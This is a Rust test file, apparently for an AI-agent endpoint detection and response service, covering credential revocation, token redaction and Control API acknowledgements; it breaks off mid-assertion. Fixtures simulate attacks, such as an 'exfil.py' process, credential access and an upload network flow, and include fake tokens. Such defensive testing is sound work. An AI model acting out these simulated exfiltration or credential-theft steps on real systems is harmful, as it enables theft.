    #[tokio::test]
    async fn agent_edr_response_action_rejects_local_api_token_revoke_grant() {
        let state = Arc::new(test_state());
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions",
                get(agent_edr_response_executions),
            )
            .with_state(state.clone());
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-revoke-grant-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                command_line: Some("python agent.py".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::CredentialAccess {
                kind: CredentialKind::ApiToken,
                path: Some("/Users/alice/.config/clawdstrike/agent-local-token".to_string()),
                name: Some("clawdstrike_agent_auth".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build revoke grant findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("revoke grant findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "revoke_grant",
            "process": {
                "processGuid": "proc-revoke-grant-1"
            },
            "ttlSeconds": 600,
            "reason": "revoke touched local agent API credential",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build revoke grant request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("revoke grant request failed: {e}"));
        assert_eq!(response.status(), StatusCode::CONFLICT);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read revoke grant response: {e}"));
        let body = String::from_utf8_lossy(&bytes);
        assert!(
            body.contains("local API auth token")
                && body.contains("not safe for autonomous response"),
            "unexpected revoke grant rejection: {body}"
        );
        assert_eq!(current_auth_token(&state), "test-token");
        assert!(auth_token_matches("test-token", &state));
    }

    #[test]
    fn revoke_grant_target_rejects_broker_capability_kind_without_id() {
        let now = chrono::Utc::now();
        let mut attributes = BTreeMap::new();
        attributes.insert(
            "credentialKind".to_string(),
            serde_json::Value::String("broker_capability".to_string()),
        );
        let node = CausalNode {
            node_id: "credential:missing-broker-id".to_string(),
            kind: CausalNodeKind::Credential,
            label: "broker_capability".to_string(),
            first_seen: now,
            last_seen: now,
            attributes,
        };
        let graph = CausalGraph {
            nodes: BTreeMap::from([(node.node_id.clone(), node)]),
            edges: Vec::new(),
        };
        let plan = EndpointResponsePlan::revoke_grant_execution(
            "credential:missing-broker-id",
            &graph,
            600,
            "missing broker capability id",
        );

        let err = revoke_grant_target(&plan, &graph)
            .err()
            .unwrap_or_else(|| panic!("broker capability kind without id should not be targeted"));
        assert!(err
            .to_string()
            .contains("local broker capability credential"));
    }

    #[test]
    fn revoke_grant_target_rejects_ambiguous_process_graph_credentials() {
        let now = chrono::Utc::now();
        let process = CausalNode {
            node_id: "process:ambiguous-revoke".to_string(),
            kind: CausalNodeKind::Process,
            label: "python exfil.py".to_string(),
            first_seen: now,
            last_seen: now,
            attributes: BTreeMap::new(),
        };
        let local_api_grant = CausalNode {
            node_id: "credential:local-api-token".to_string(),
            kind: CausalNodeKind::Credential,
            label: "clawdstrike_agent_auth".to_string(),
            first_seen: now,
            last_seen: now,
            attributes: BTreeMap::from([(
                "name".to_string(),
                serde_json::Value::String("clawdstrike_agent_auth".to_string()),
            )]),
        };
        let webhook_secret = CausalNode {
            node_id: "credential:webhook-secret".to_string(),
            kind: CausalNodeKind::Credential,
            label: "local integration credential".to_string(),
            first_seen: now,
            last_seen: now,
            attributes: BTreeMap::from([(
                "settingKey".to_string(),
                serde_json::Value::String("integrations.webhooks.secret".to_string()),
            )]),
        };
        let graph = CausalGraph {
            nodes: BTreeMap::from([
                (process.node_id.clone(), process),
                (local_api_grant.node_id.clone(), local_api_grant),
                (webhook_secret.node_id.clone(), webhook_secret),
            ]),
            edges: Vec::new(),
        };
        let plan = EndpointResponsePlan::revoke_grant_execution(
            "process:ambiguous-revoke",
            &graph,
            600,
            "revoke touched credential",
        );

        let err = revoke_grant_target(&plan, &graph)
            .err()
            .unwrap_or_else(|| panic!("ambiguous process graph should not pick a credential"));
        assert!(err
            .to_string()
            .contains("ambiguous live revoke_grant target"));
    }

    #[test]
    fn revoke_grant_target_resolves_structured_local_webhook_secret_setting_key() {
        let now = chrono::Utc::now();
        let mut attributes = BTreeMap::new();
        attributes.insert(
            "credentialKind".to_string(),
            serde_json::Value::String("local_integration_secret".to_string()),
        );
        attributes.insert(
            "settingKey".to_string(),
            serde_json::Value::String("integrations.webhooks.secret".to_string()),
        );
        let node = CausalNode {
            node_id: "credential:structured-webhook-secret".to_string(),
            kind: CausalNodeKind::Credential,
            label: "local integration credential".to_string(),
            first_seen: now,
            last_seen: now,
            attributes,
        };
        let graph = CausalGraph {
            nodes: BTreeMap::from([(node.node_id.clone(), node)]),
            edges: Vec::new(),
        };
        let plan = EndpointResponsePlan::revoke_grant_execution(
            "credential:structured-webhook-secret",
            &graph,
            600,
            "revoke structured webhook secret",
        );

        let target = revoke_grant_target(&plan, &graph)
            .unwrap_or_else(|err| panic!("structured webhook secret should resolve: {err}"));
        assert_eq!(
            target,
            RevokeGrantTarget::LocalIntegrationSecret {
                secret: LocalIntegrationSecretKind::WebhooksSecret
            }
        );
    }

    #[test]
    fn revoke_grant_target_resolves_nested_local_siem_secret_attribute() {
        let now = chrono::Utc::now();
        let mut attributes = BTreeMap::new();
        attributes.insert(
            "localIntegrationSecret".to_string(),
            serde_json::json!({
                "kind": "siem.api_key",
                "provider": "datadog"
            }),
        );
        let node = CausalNode {
            node_id: "credential:nested-siem-secret".to_string(),
            kind: CausalNodeKind::Credential,
            label: "local integration credential".to_string(),
            first_seen: now,
            last_seen: now,
            attributes,
        };
        let graph = CausalGraph {
            nodes: BTreeMap::from([(node.node_id.clone(), node)]),
            edges: Vec::new(),
        };
        let plan = EndpointResponsePlan::revoke_grant_execution(
            "credential:nested-siem-secret",
            &graph,
            600,
            "revoke nested SIEM secret",
        );

        let target = revoke_grant_target(&plan, &graph)
            .unwrap_or_else(|err| panic!("nested SIEM secret should resolve: {err}"));
        assert_eq!(
            target,
            RevokeGrantTarget::LocalIntegrationSecret {
                secret: LocalIntegrationSecretKind::SiemApiKey
            }
        );
    }

    #[derive(Clone, Default)]
    struct MockBrokerdRevokeState {
        requests: Arc<Mutex<Vec<MockBrokerdRevokeRequest>>>,
    }

    #[derive(Clone, Debug)]
    struct MockBrokerdRevokeRequest {
        capability_id: String,
        authorization: Option<String>,
    }

    async fn mock_brokerd_revoke_capability(
        State(state): State<MockBrokerdRevokeState>,
        headers: HeaderMap,
        Path(capability_id): Path<String>,
    ) -> Json<BrokerCapabilityRevokeReport> {
        state.requests.lock().await.push(MockBrokerdRevokeRequest {
            capability_id: capability_id.clone(),
            authorization: headers
                .get(AUTHORIZATION)
                .and_then(|value| value.to_str().ok())
                .map(str::to_string),
        });
        Json(BrokerCapabilityRevokeReport {
            capability_id,
            revoked: true,
            provider_revocation: Some(BrokerProviderTokenRevocationReport {
                provider: "github".to_string(),
                secret_ref_id: "github/prod".to_string(),
                attempted: true,
                supported: true,
                revoked: true,
                status_code: Some(204),
                provider_token_hash: Some(sha256(b"ghs-provider-revoke").to_hex_prefixed()),
                response_body_sha256: None,
                reason: None,
            }),
        })
    }

    async fn mock_brokerd_revoke_failure() -> (StatusCode, Json<serde_json::Value>) {
        (
            StatusCode::BAD_GATEWAY,
            Json(serde_json::json!({
                "message": "provider revoke failed",
                "providerToken": "ghs_1234567890abcdef1234"
            })),
        )
    }

    async fn mock_brokerd_revoke_shadow_report() -> Json<serde_json::Value> {
        Json(serde_json::json!({
            "capability_id": "cap-response-123",
            "revoked": true,
            "provider_revocation": {
                "provider": "github",
                "secret_ref_id": "github/prod",
                "attempted": true,
                "supported": true,
                "revoked": true,
                "status_code": 204,
                "provider_token_hash": sha256(b"ghs-provider-revoke").to_hex_prefixed(),
                "shadow_provider_token": "ghs-shadow-token"
            }
        }))
    }

    async fn spawn_mock_brokerd_revoke(
    ) -> (u16, MockBrokerdRevokeState, tokio::task::JoinHandle<()>) {
        let state = MockBrokerdRevokeState::default();
        let app = Router::new()
            .route(
                "/v1/capabilities/{capability_id}/revoke",
                post(mock_brokerd_revoke_capability),
            )
            .with_state(state.clone());
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .unwrap_or_else(|e| panic!("failed to bind mock brokerd: {e}"));
        let port = listener
            .local_addr()
            .unwrap_or_else(|e| panic!("failed to read mock brokerd port: {e}"))
            .port();
        let handle = tokio::spawn(async move {
            axum::serve(listener, app)
                .await
                .unwrap_or_else(|e| panic!("mock brokerd failed: {e}"));
        });
        (port, state, handle)
    }

    async fn spawn_mock_brokerd_revoke_failure() -> (u16, tokio::task::JoinHandle<()>) {
        let app = Router::new().route(
            "/v1/capabilities/{capability_id}/revoke",
            post(mock_brokerd_revoke_failure),
        );
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .unwrap_or_else(|e| panic!("failed to bind failing mock brokerd: {e}"));
        let port = listener
            .local_addr()
            .unwrap_or_else(|e| panic!("failed to read failing mock brokerd port: {e}"))
            .port();
        let handle = tokio::spawn(async move {
            axum::serve(listener, app)
                .await
                .unwrap_or_else(|e| panic!("failing mock brokerd failed: {e}"));
        });
        (port, handle)
    }

    async fn spawn_mock_brokerd_revoke_shadow_report() -> (u16, tokio::task::JoinHandle<()>) {
        let app = Router::new().route(
            "/v1/capabilities/{capability_id}/revoke",
            post(mock_brokerd_revoke_shadow_report),
        );
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .unwrap_or_else(|e| panic!("failed to bind shadow mock brokerd: {e}"));
        let port = listener
            .local_addr()
            .unwrap_or_else(|e| panic!("failed to read shadow mock brokerd port: {e}"))
            .port();
        let handle = tokio::spawn(async move {
            axum::serve(listener, app)
                .await
                .unwrap_or_else(|e| panic!("shadow mock brokerd failed: {e}"));
        });
        (port, handle)
    }

    #[tokio::test]
    async fn revoke_broker_capability_grant_redacts_failure_body() {
        let state = test_state();
        let (brokerd_port, brokerd_task) = spawn_mock_brokerd_revoke_failure().await;
        {
            let mut settings = state.settings.write().await;
            settings.brokerd.enabled = true;
            settings.brokerd.port = brokerd_port;
            settings.brokerd.admin_token = Some("broker-admin-token".to_string());
        }

        let err = revoke_broker_capability_grant(&state, "cap-response-123")
            .await
            .err()
            .unwrap_or_else(|| panic!("failing brokerd revoke should return an error"));
        assert_eq!(err.0, StatusCode::BAD_GATEWAY);
        assert!(err.1.contains("brokerd capability revoke returned HTTP"));
        assert!(err.1.contains("[REDACTED]"));
        assert!(!err.1.contains("ghs_1234567890abcdef1234"));
        assert!(err.1.len() <= 320);

        brokerd_task.abort();
    }

    #[tokio::test]
    async fn revoke_broker_capability_grant_rejects_shadow_provider_report_fields() {
        assert_unknown_field_rejected::<BrokerCapabilityRevokeReport>(
            serde_json::json!({
                "capability_id": "cap-response-123",
                "revoked": true,
                "shadow_capability_id": "cap-shadow"
            }),
            "shadow_capability_id",
        );
        assert_unknown_field_rejected::<BrokerCapabilityRevokeReport>(
            serde_json::json!({
                "capability_id": "cap-response-123",
                "revoked": true,
                "provider_revocation": {
                    "provider": "github",
                    "secret_ref_id": "github/prod",
                    "attempted": true,
                    "supported": true,
                    "revoked": true,
                    "shadow_provider_token": "ghs-shadow-token"
                }
            }),
            "shadow_provider_token",
        );

        let state = test_state();
        let (brokerd_port, brokerd_task) = spawn_mock_brokerd_revoke_shadow_report().await;
        {
            let mut settings = state.settings.write().await;
            settings.brokerd.enabled = true;
            settings.brokerd.port = brokerd_port;
            settings.brokerd.admin_token = Some("broker-admin-token".to_string());
        }

        let err = revoke_broker_capability_grant(&state, "cap-response-123")
            .await
            .err()
            .unwrap_or_else(|| panic!("shadow brokerd revoke report should return an error"));
        assert_eq!(err.0, StatusCode::BAD_GATEWAY);
        assert!(
            err.1
                .contains("brokerd capability revoke response was invalid")
                && err.1.contains("unknown field")
                && err.1.contains("shadow_provider_token"),
            "unexpected brokerd shadow report error: {}",
            err.1
        );

        brokerd_task.abort();
    }

    #[tokio::test]
    async fn agent_edr_response_action_redacts_brokerd_failure_from_failed_execution() {
        let state = Arc::new(test_state());
        let (brokerd_port, brokerd_task) = spawn_mock_brokerd_revoke_failure().await;
        {
            let mut settings = state.settings.write().await;
            settings.brokerd.enabled = true;
            settings.brokerd.port = brokerd_port;
            settings.brokerd.admin_token = Some("broker-admin-token".to_string());
        }

        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions",
                get(agent_edr_response_executions),
            )
            .with_state(state.clone());
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-broker-failure-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                command_line: Some("python agent.py".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::CredentialAccess {
                kind: CredentialKind::Other("broker_capability".to_string()),
                path: None,
                name: Some("broker-capability:cap-response-123".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build broker failure findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("broker failure findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "revoke_grant",
            "process": {
                "processGuid": "proc-broker-failure-1"
            },
            "ttlSeconds": 600,
            "reason": "revoke touched broker capability credential",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build broker failure response-action request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("broker failure response-action request failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_GATEWAY);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read broker failure response-action error: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("broker failure response-action error is not utf8: {e}"));
        assert!(error.contains("failed response execution recorded as"));
        assert!(error.contains("[REDACTED]"));
        assert!(!error.contains("ghs_1234567890abcdef1234"));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/response-executions?limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build broker failure execution list request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("broker failure execution list request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read broker failure execution list: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode broker failure execution list: {e}"));
        assert_eq!(payload["execution_count"], 1);
        let execution = &payload["executions"][0]["execution"];
        assert_eq!(execution["action"], "revoke_grant");
        assert_eq!(execution["status"], "failed");
        let reason = execution["reason"]
            .as_str()
            .unwrap_or_else(|| panic!("missing failed revoke reason"));
        let summary = execution["summary"]
            .as_str()
            .unwrap_or_else(|| panic!("missing failed revoke summary"));
        assert!(reason.contains("[REDACTED]"));
        assert!(summary.contains("[REDACTED]"));
        assert!(!reason.contains("ghs_1234567890abcdef1234"));
        assert!(!summary.contains("ghs_1234567890abcdef1234"));

        brokerd_task.abort();
    }

    #[derive(Clone, Default)]
    struct MockControlApiAckState {
        requests: Arc<Mutex<Vec<MockControlApiAckRequest>>>,
        failures_remaining: Arc<Mutex<usize>>,
    }

    #[derive(Clone, Debug)]
    struct MockControlApiAckRequest {
        response_action_id: String,
        authorization: Option<String>,
        api_key: Option<String>,
        body: serde_json::Value,
    }

    async fn mock_control_api_record_ack(
        State(state): State<MockControlApiAckState>,
        headers: HeaderMap,
        Path(response_action_id): Path<String>,
        Json(body): Json<serde_json::Value>,
    ) -> Response {
        state.requests.lock().await.push(MockControlApiAckRequest {
            response_action_id,
            authorization: headers
                .get(AUTHORIZATION)
                .and_then(|value| value.to_str().ok())
                .map(str::to_string),
            api_key: headers
                .get("x-api-key")
                .and_then(|value| value.to_str().ok())
                .map(str::to_string),
            body,
        });
        let mut failures_remaining = state.failures_remaining.lock().await;
        if *failures_remaining > 0 {
            *failures_remaining -= 1;
            return (
                StatusCode::SERVICE_UNAVAILABLE,
                Json(serde_json::json!({ "accepted": false })),
            )
                .into_response();
        }
        Json(serde_json::json!({ "accepted": true })).into_response()
    }

    async fn spawn_mock_control_api_ack(
    ) -> (String, MockControlApiAckState, tokio::task::JoinHandle<()>) {
        let state = MockControlApiAckState::default();
        let app = Router::new()
            .route(
                "/api/v1/response-actions/{response_action_id}/acks",
                post(mock_control_api_record_ack),
            )
            .route(
                "/api/v1/response-actions/{response_action_id}/agent-acks",
                post(mock_control_api_record_ack),
            )
            .with_state(state.clone());
        let listener = TcpListener::bind("127.0.0.1:0")
            .await
            .unwrap_or_else(|e| panic!("failed to bind mock Control API: {e}"));
        let port = listener
            .local_addr()
            .unwrap_or_else(|e| panic!("failed to read mock Control API port: {e}"))
            .port();
        let handle = tokio::spawn(async move {
            axum::serve(listener, app)
                .await
                .unwrap_or_else(|e| panic!("mock Control API failed: {e}"));
        });
        (format!("http://127.0.0.1:{port}"), state, handle)
    }

    #[tokio::test]
    async fn control_ack_postback_config_uses_agent_ack_route_without_api_key() {
        let state = test_state();
        {
            let mut settings = state.settings.write().await;
            settings.control_api.enabled = true;
            settings.control_api.url = Some("http://127.0.0.1:3000".to_string());
            settings.control_api.api_key = None;
        }
        let input = EdrResponseControlAcknowledgementInput {
            response_action_id: Some("11111111-1111-4111-8111-111111111111".to_string()),
            delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
            target_kind: Some("endpoint".to_string()),
            target_id: Some("test-agent".to_string()),
            ack_token: Some("ack-token".to_string()),
            status: Some("acknowledged".to_string()),
            resulting_state: Some("collect_evidence:succeeded".to_string()),
            control_api_url: None,
            control_api_token: None,
        };

        let config = resolve_control_response_ack_postback_config(&state, &input)
            .await
            .unwrap_or_else(|err| panic!("failed to resolve postback config: {err:?}"))
            .unwrap_or_else(|| panic!("expected configured bearerless postback"));
        assert_eq!(config.route, ControlResponseAckPostbackRoute::AgentAcks);
        assert!(config.api_key.is_none());
        let url = control_api_ack_postback_url(
            &config.control_api_url,
            input
                .response_action_id
                .as_deref()
                .unwrap_or_else(|| panic!("missing response action id")),
            config.route,
        )
        .unwrap_or_else(|err| panic!("failed to build agent-acks URL: {err:?}"));
        assert_eq!(
            url,
            "http://127.0.0.1:3000/api/v1/response-actions/11111111-1111-4111-8111-111111111111/agent-acks"
        );
    }

    #[tokio::test]
    async fn control_ack_retry_sink_persists_response_command_postback() {
        let state = Arc::new(test_state());
        let retry_path = test_control_ack_postback_retry_path();
        {
            let mut retry_ledger = state.edr_control_ack_postback_retry_ledger.lock().await;
            *retry_ledger = EndpointControlAckPostbackRetryLedger::open(retry_path.clone())
                .unwrap_or_else(|err| panic!("failed to open control ack retry ledger: {err}"));
        }
        let sink = ControlAckPostbackRetrySink {
            state: state.clone(),
        };
        let observed_at = chrono::DateTime::parse_from_rfc3339("2026-05-18T12:00:00Z")
            .unwrap_or_else(|err| panic!("failed to parse observed_at: {err}"))
            .with_timezone(&chrono::Utc);

        sink.enqueue(ControlAckPostbackRetryRequest {
            control_api_url: "http://127.0.0.1:3000/".to_string(),
            use_authenticated_route: false,
            response_action_id: "11111111-1111-4111-8111-111111111111".to_string(),
            target_kind: "endpoint".to_string(),
            target_id: "agent-1".to_string(),
            ack_token: "response-command-ack-token".to_string(),
            status: "acknowledged".to_string(),
            observed_at,
            message: Some("policy rule-diff validation completed".to_string()),
            resulting_state: Some("policy_rule_diff_validation:succeeded".to_string()),
            raw_payload: serde_json::json!({
                "policyRuleDiffValidation": {
                    "proposalId": "22222222-2222-4222-8222-222222222222",
                    "endpointAgentId": "agent-1"
                }
            }),
            failure_message: "Control API temporarily unavailable".to_string(),
        })
        .await
        .unwrap_or_else(|err| panic!("failed to enqueue response command retry: {err}"));

        let persisted = std::fs::read_to_string(&retry_path)
            .unwrap_or_else(|err| panic!("failed to read persisted retry queue: {err}"));
        assert!(persisted.contains("response-command-ack-token"));
        assert!(persisted.contains("policy_rule_diff_validation:succeeded"));
        let retries = read_control_ack_postback_retry_ledger(&retry_path)
            .unwrap_or_else(|err| panic!("failed to read retry ledger: {err}"));
        assert_eq!(retries.len(), 1);
        let retry = &retries[0];
        assert_eq!(
            retry.response_action_id,
            "11111111-1111-4111-8111-111111111111"
        );
        assert_eq!(retry.control_api_url, "http://127.0.0.1:3000");
        assert_eq!(
            retry.preferred_route,
            ControlResponseAckPostbackRoute::AgentAcks
        );
        assert_eq!(retry.target_kind, "endpoint");
        assert_eq!(retry.target_id, "agent-1");
        assert_eq!(retry.status, "acknowledged");
        assert_eq!(retry.observed_at, observed_at);
        assert!(retry.retry_id.starts_with("0x"));
        assert!(retry.next_attempt_at > observed_at);
        assert_eq!(
            retry.raw_payload["policyRuleDiffValidation"]["proposalId"],
            "22222222-2222-4222-8222-222222222222"
        );

        let _ = std::fs::remove_file(retry_path);
    }

    #[tokio::test]
    async fn due_control_ack_retry_drain_delivers_without_force() {
        let state = Arc::new(test_state());
        let retry_path = test_control_ack_postback_retry_path();
        {
            let mut retry_ledger = state.edr_control_ack_postback_retry_ledger.lock().await;
            *retry_ledger = EndpointControlAckPostbackRetryLedger::open(retry_path.clone())
                .unwrap_or_else(|err| panic!("failed to open control ack retry ledger: {err}"));
        }
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_ack().await;
        let observed_at = chrono::DateTime::parse_from_rfc3339("2026-05-18T12:30:00Z")
            .unwrap_or_else(|err| panic!("failed to parse observed_at: {err}"))
            .with_timezone(&chrono::Utc);
        let now = chrono::Utc::now();
        let ack_token = "due-response-command-ack-token";
        {
            let mut retry_ledger = state.edr_control_ack_postback_retry_ledger.lock().await;
            retry_ledger
                .append(EndpointControlAckPostbackRetry {
                    retry_id: "0xdueackretry".to_string(),
                    response_action_id: "55555555-5555-4555-8555-555555555555".to_string(),
                    control_api_url: control_api_url.clone(),
                    preferred_route: ControlResponseAckPostbackRoute::AgentAcks,
                    target_kind: "endpoint".to_string(),
                    target_id: "agent-1".to_string(),
                    ack_token: ack_token.to_string(),
                    ack_token_hash: sha256(ack_token.as_bytes()).to_hex_prefixed(),
                    status: "acknowledged".to_string(),
                    observed_at,
                    message: Some("background retry drain".to_string()),
                    resulting_state: Some("policy_rule_diff_validation:succeeded".to_string()),
                    raw_payload: serde_json::json!({
                        "policyRuleDiffValidation": {
                            "proposalId": "66666666-6666-4666-8666-666666666666",
                            "endpointAgentId": "agent-1"
                        }
                    }),
                    attempt_count: 1,
                    next_attempt_at: now - chrono::Duration::seconds(1),
                    last_attempt_at: Some(now - chrono::Duration::seconds(30)),
                    last_http_status: None,
                    last_response_hash: None,
                    last_error_hash: None,
                    created_at: now - chrono::Duration::seconds(30),
                    updated_at: now - chrono::Duration::seconds(30),
                })
                .unwrap_or_else(|err| panic!("failed to append due control ack retry: {err}"));
        }

        let response = drain_control_ack_postback_retries(&state, 25, false)
            .await
            .unwrap_or_else(|err| panic!("failed to drain due control ack retry: {err:?}"));
        assert_eq!(response.attempted, 1);
        assert_eq!(response.delivered, 1);
        assert_eq!(response.failed, 0);
        assert_eq!(response.pending, 0);
        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 1);
        assert_eq!(
            requests[0].response_action_id,
            "55555555-5555-4555-8555-555555555555"
        );
        assert_eq!(requests[0].body["ackToken"], ack_token);
        assert_eq!(requests[0].body["status"], "acknowledged");
        assert_eq!(
            requests[0].body["rawPayload"]["policyRuleDiffValidation"]["proposalId"],
            "66666666-6666-4666-8666-666666666666"
        );
        drop(requests);

        control_api_task.abort();
        let _ = std::fs::remove_file(retry_path);
    }

    #[tokio::test]
    async fn agent_edr_response_acknowledgement_posts_to_configured_control_api() {
        let state = Arc::new(test_state());
        let (control_api_url, control_api_state, control_api_task) =
            spawn_mock_control_api_ack().await;
        {
            let mut settings = state.settings.write().await;
            settings.control_api.enabled = true;
            settings.control_api.url = Some(control_api_url.clone());
            settings.control_api.api_key = Some("configured-control-api-key".to_string());
        }
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge",
                post(agent_edr_response_execution_acknowledge),
            )
            .with_state(state.clone());
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-configured-control-ack-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "configured-control-ack.example.invalid".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://configured-control-ack.example.invalid/upload".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build configured ack findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("configured ack findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "collect_evidence",
            "process": {
                "processGuid": "proc-configured-control-ack-1"
            },
            "ttlSeconds": 600,
            "reason": "collect evidence before configured control acknowledgement",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build configured ack response-action request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("configured ack response-action request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read configured ack response-action body: {e}"));
        let action_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode configured ack action response: {e}"));
        let execution_id = action_payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing configured ack execution id"));

        let response_action_id = "11111111-1111-4111-8111-111111111111";
        let delivery_id = "22222222-2222-4222-8222-222222222222";
        let body = serde_json::json!({
            "acknowledgedBy": "local-agent",
            "note": "configured Control API postback",
            "control": {
                "responseActionId": response_action_id,
                "deliveryId": delivery_id,
                "targetKind": "endpoint",
                "targetId": "test-agent",
                "ackToken": "configured-control-ack-token",
                "status": "acknowledged",
                "resultingState": "collect_evidence:succeeded"
            }
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build configured acknowledgement request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("configured acknowledgement request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read configured acknowledgement response: {e}"));
        let acknowledgement_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| {
                panic!("failed to decode configured acknowledgement response: {e}")
            });
        assert_eq!(
            acknowledgement_payload["controlPostback"]["accepted"],
            serde_json::Value::Bool(true)
        );
        assert_eq!(
            acknowledgement_payload["controlPostback"]["httpStatus"],
            serde_json::Value::from(200)
        );
        assert_eq!(
            acknowledgement_payload["controlPostback"]["controlApiUrl"],
            control_api_url
        );

        let requests = control_api_state.requests.lock().await;
        assert_eq!(requests.len(), 1);
        let request = &requests[0];
        assert_eq!(request.response_action_id, response_action_id);
        assert!(request.authorization.is_none());
        assert_eq!(
